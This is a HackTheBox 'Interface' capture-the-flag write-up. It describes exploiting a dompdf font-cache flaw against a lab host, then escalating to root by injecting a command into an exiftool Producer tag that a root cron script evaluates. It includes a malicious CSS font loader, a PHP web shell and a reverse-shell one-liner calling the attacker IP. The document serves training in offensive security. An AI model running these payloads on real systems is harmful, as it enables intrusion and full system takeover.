# HackTheBox - Interface

## NMAP

```bash
Nmap scan report for 10.10.11.200
Host is up (0.38s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7289a0957eceaea8596b2d2dbc90b55a (RSA)
|   256 01848c66d34ec4b1611f2d4d389c42c3 (ECDSA)
|_  256 cc62905560a658629e6b80105c799b55 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Site Maintenance
|_http-favicon: Unknown favicon MD5: 21B739D43FCB9BBB83D8541FE4FE88FA
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## PORT 80 (HTTP)

The webserver shows a note on the site about some maintenance

<img src="https://i.imgur.com/cewxBvP.png"/>

Fuzzing for files and directories using `dirsearch`

<img src="https://i.imgur.com/tSYCcYy.png"/>

It didn't find anything from fuzzing, on checking the response headers it has some sites being shown out of which there's `prd.m.rendering-api.interface.htb`

<img src="https://i.imgur.com/J8nK7vT.png"/>

<img src="https://i.imgur.com/dbN5vx3.png"/>
Here I tried fuzzing but again there were no results other than `vendor` so fuzzing there again to see if there's something accessible 

<img src="https://i.imgur.com/l7ihRo4.png"/>

<img src="https://i.imgur.com/rvaZyq7.png"/>
This found `/dompdf`  but it's giving us 403 

<img src="https://i.imgur.com/rET8jEC.png"/>

Since this is an api from what the subdomain tells us, let's try fuzzing on `/api` for POST requests

<img src="https://i.imgur.com/sFroW9J.png"/>

## Foothold

For sending a POST request to `html2pdf` I struggled a lot in finding a proper way to send POST requests and documentaiton didn't really included that, on dompdf's github page I found that it's using `html` parameter for converting html

https://github.com/dompdf/dompdf/wiki/About-Fonts-and-Character-Encoding

<img src="https://i.imgur.com/HQsEXg6.png"/>
With this request we'll be able to convert HTML to PDF

<img src="https://i.imgur.com/WM1wjXu.png"/>

Dompdf is vulnerable to remote code execution through loading css which then loads the font that is cached 

https://positive.security/blog/dompdf-rce

We have our css file which is loading the font that is actually a php file executing `phpinfo()` and from the article it explains that dompdf excepts any file extension as long as header belongs to a font file

```css
@font-face {
    font-family:'exploitfont';
    src:url('http://10.10.14.70:9001/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
  }
```

And we have our font file 

https://github.com/positive-security/dompdf-rce/blob/main/exploit/exploit_font.php

<img src="https://i.imgur.com/8yUDDaj.png"/>

We need to load a css with from our machine so sending a request with href

```html
<link rel=stylesheet href='http://10.10.14.70:9001/exploit.css'>"
```

<img src="https://i.imgur.com/gky9UDl.png"/>

<img src="https://i.imgur.com/ymxB8Eg.png"/>

To access the cached php font file we need to visit this url to access our cached font php file

```
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/fontname_fontweight/style_urlmd5hash.php
```

To calculate the hash of the url
`http://10.10.14.70:9001/exploit_font.php`

<img src="https://i.imgur.com/uNYTPqj.png"/>

So the url becomes

```
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_3b08b785afb0c81b1ea0920e80175f2d.php
```

<img src="https://i.imgur.com/D6oIkFw.png"/>

We can now get rce by just adding `<?php system($_GET['cmd']);?>`

<img src="https://i.imgur.com/J84wfyi.png"/>

With php we can get reverse shell

```bash
http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_3b08b785afb0c81b1ea0920e80175f2d.php?cmd=php%20-r%20%27$sock=fsockopen(%2210.10.14.70%22,2222);$proc=proc_open(%22/bin/sh%20-i%22,%20array(0=%3E$sock,%201=%3E$sock,%202=%3E$sock),$pipes);%27
```

<img src="https://i.imgur.com/VP0I1D6.png"/>

## Privilege Escalation (root)

Running `pspy` we see a bash script `/usr/local/sbin/cleancache.sh` being ran as root user

<img src="https://i.imgur.com/cYuEdz2.png"/>

Checking the bash script

```bash
#! /bin/bash           
cache_directory="/tmp"
for cfile in "$cache_directory"/*; do
    if [[ -f "$cfile" ]]; then
        meta_producer=$(/usr/bin/exiftool -s -s -s -Producer "$cfile" 2>/dev/null | cut -d " " -f1)
        if [[ "$meta_producer" -eq "dompdf" ]]; then                                                                                                                                                                             
            echo "Removing $cfile"                                                                                                                                                                                               
            rm "$cfile"                               
        fi
    fi                                                                                                                                                                                                                                                                              
done 
```

It's running `/tmp` directory where it's checking for files and `exiftool` is looking for `Producer` tag in the files and comaparing it with `-eq` if it's dompdf and if it, it will delete that file

I checked the version of exiftool which was 12.55 and there wasn't any reported vulnerability for this version

<img src="https://i.imgur.com/E5Gps4u.png"/>

The vulnerability here was with in the script on the comparision

```bash
"$meta_producer" -eq "dompdf"
```

```bash
exiftool -Producer='a[$(id)]+dompdf' ./export.pdf
```

<img src="https://i.imgur.com/oXrsHsf.png"/>

<img src="https://i.imgur.com/J1Li94O.png"/>

Now we can't really use spaces here as the Producer meta data is being seperated with `cut` on a space so instead I created a bash script having the reverse shell

```bash
exiftool -Producer='a[$(/dev/shm/uwu.sh)]+dompdf' ./export.pdf
```

<img src="https://i.imgur.com/s1TfBHw.png"/>

After transffering the file, wait for the cronjob to trigger the script

<img src="https://i.imgur.com/xXFIUUc.png"/>
## References

- https://github.com/dompdf/dompdf/wiki/About-Fonts-and-Character-Encoding
- https://positive.security/blog/dompdf-rce
- https://github.com/positive-security/dompdf-rce
- https://www.vidarholen.net/contents/blog/?p=716
